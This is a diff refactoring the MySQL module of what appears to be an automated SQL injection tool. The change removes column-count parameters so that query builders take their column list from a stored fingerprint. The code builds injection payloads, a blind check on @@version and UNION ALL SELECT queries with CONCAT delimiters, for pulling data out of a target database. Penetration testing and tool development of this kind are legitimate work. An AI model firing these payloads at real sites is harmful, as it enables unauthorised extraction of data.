@@ -127,9 +127,9 @@ class MysqlMole(DbmsMole):
     def dbms_check_blind_query(cls):
         return ' and 0 < (select length(@@version)) '
 
-    def forge_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
+    def forge_count_query(self, fields, table_name, injectable_field, where = "1=1"):
         query = " and 1=0 UNION ALL SELECT "
-        query_list = list(map(str, range(column_count)))
+        query_list = list(self.finger._query)
         query_list[injectable_field] = ("CONCAT(" + MysqlMole.out_delimiter + ",COUNT(*)," + MysqlMole.out_delimiter + ")")
         query += ','.join(query_list)
         if len(table_name) > 0:
@@ -137,9 +137,9 @@ class MysqlMole(DbmsMole):
             query += " where " + self.parse_condition(where)
         return query
 
-    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_query(self, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1=0 UNION ALL SELECT "
-        query_list = list(map(str, range(column_count)))
+        query_list = list(self.finger._query)
         query_list[injectable_field] = ("CONCAT(" +
                                             MysqlMole.out_delimiter +
                                             "," + self._concat_fields(fields) + "," +
@@ -152,7 +152,7 @@ class MysqlMole(DbmsMole):
                      " limit 1 offset " + str(offset) + " "
         return query
 
-    def forge_integer_count_query(self, columns, fields, table, injectable_field, where="1=1", offset=0):
+    def forge_integer_count_query(self, fields, table, injectable_field, where="1=1", offset=0):
         if len(table) > 0:
             table = ' from ' + table
             where = ' where ' + where
@@ -166,7 +166,7 @@ class MysqlMole(DbmsMole):
         query += table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)
         return query
 
-    def forge_integer_query(self, columns, index, fields, table, injectable_field, where="1=1", offset=0):
+    def forge_integer_query(self, index, fields, table, injectable_field, where="1=1", offset=0):
         if len(table) > 0:
             table = ' from ' + table
             where = ' where ' + where
@@ -180,7 +180,7 @@ class MysqlMole(DbmsMole):
         query += table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)
         return query
 
-    def forge_integer_len_query(self, columns, fields, table, injectable_field, where="1=1", offset=0):
+    def forge_integer_len_query(self, fields, table, injectable_field, where="1=1", offset=0):
         if len(table) > 0:
             table = ' from ' + table
             where = ' where ' + where
@@ -196,6 +196,7 @@ class MysqlMole(DbmsMole):
 
     def set_good_finger(self, finger):
         self.finger = finger
+        self.finger._query = list(map(lambda x: str(x), range(len(self.finger._query))))
 
     def parse_results(self, url_data):
         if not self.finger or self.finger.is_string_query:
